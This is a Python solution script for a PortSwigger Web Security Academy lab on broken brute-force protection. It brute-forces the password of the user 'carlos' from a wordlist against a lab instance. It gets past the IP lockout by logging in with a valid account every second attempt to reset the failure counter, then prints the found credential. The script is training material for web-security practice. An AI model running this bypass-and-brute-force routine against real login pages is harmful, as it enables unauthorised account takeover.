# Lab: Broken brute-force protection, IP block

import requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

base = "https://0a79005b0498e5af819fd9ac00120017.web-security-academy.net"
guess_session = requests.Session()

'''
This lab's login shows 2 different messages

Normaly it shows you "Incorrect passwrd"
But if you input 3 wrong password then it will make you wait for 1 minute => so, the maximum consequence input is "2 times"

                       <p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>

                                              <p class=is-warning>Incorrect password</p>
'''

print("===========[step1] prep files for login bruteforce===============")
# prep username/password list (provided by portswigger's academy)
cwd = Path(__file__).resolve().parent
pass_file = cwd / "password.txt"

with open(pass_file, "r", encoding="utf-8") as passfile:
    pass_content=passfile.read()

pass_list=pass_content.splitlines()

# list for account which can successfully login
print()
print("[*] Ready to Brute Force")
print()
valid_account = []
username="carlos"

print("===========[step2] Find Valid password===============")
for i, password in enumerate(pass_list):
    if i % 2 == 0:   # 2번 틀리기 전에 정상 로그인으로 카운터 리셋 (비번 소모 X)
        requests.post(f"{base}/login", data={"username": "wiener", "password": "peter"}, allow_redirects=False)
    r = requests.post(f"{base}/login", data={"username": username, "password": password}, allow_redirects=False)
    if r.status_code == 302:
        print(f"Found: {username} / {password}")
        valid_account.append({username: password})
        break
'''
[!] if username or password mismatch it will return below:
                        <p class=is-warning>Invalid username or password.</p>
'''
print()
print("[*] Listing Found Credentials")
for i, account in enumerate(valid_account, start=1):
    print(f"[{i}] {account}")
print()

'''
[+] Found Account
carlos / 12345678
'''
